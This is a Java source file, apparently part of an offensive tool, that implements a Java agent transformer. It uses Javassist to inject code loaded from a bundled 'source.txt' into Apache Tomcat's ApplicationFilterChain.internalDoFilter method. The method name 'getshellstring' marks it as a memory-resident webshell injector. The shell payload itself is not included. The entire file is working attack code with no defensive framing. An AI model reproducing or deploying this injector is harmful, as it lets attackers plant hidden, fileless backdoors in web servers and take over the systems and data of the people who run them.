package forTomcat;

import javassist.*;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.instrument.ClassFileTransformer;
import java.security.ProtectionDomain;

public class Mytransformer implements ClassFileTransformer {

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain,
                            byte[] classfileBuffer) {
        if (!className.equals("org/apache/catalina/core/ApplicationFilterChain")){
            return  classfileBuffer;
        }

        try {
            ClassPool cp =ClassPool.getDefault();
            ClassClassPath ccp = new ClassClassPath(className.getClass());
            cp.insertClassPath(ccp);
            CtClass ctClass =cp.get("org.apache.catalina.core.ApplicationFilterChain");
            CtMethod ctMethod = ctClass.getDeclaredMethod("internalDoFilter");
            if (!getshellstring().equals("no get shell")) {
                ctMethod.insertBefore(getshellstring());
                byte[] bytes = ctClass.toBytecode();
                ctClass.detach();
                System.out.println("succeed in  changing classbytes");
                return bytes;
            }
            return classfileBuffer;
        }catch (Exception e){
            System.out.println("failed at get classbytes "+e);
            return classfileBuffer;
        }
    }

    public static String getshellstring() {
        StringBuilder source=new StringBuilder();
        InputStream is = Mytransformer.class.getClassLoader().getResourceAsStream("source.txt");
        try {

        try(InputStreamReader isr = new InputStreamReader(is);
            BufferedReader br = new BufferedReader(isr)
        ) {
            String line = null;
            while ((line = br.readLine()) != null) {
                source.append(line);
            }
            return new String(source);
        }

        }catch (Exception e){

            System.out.println(e);
            return "no get shell";
        }

    }

}
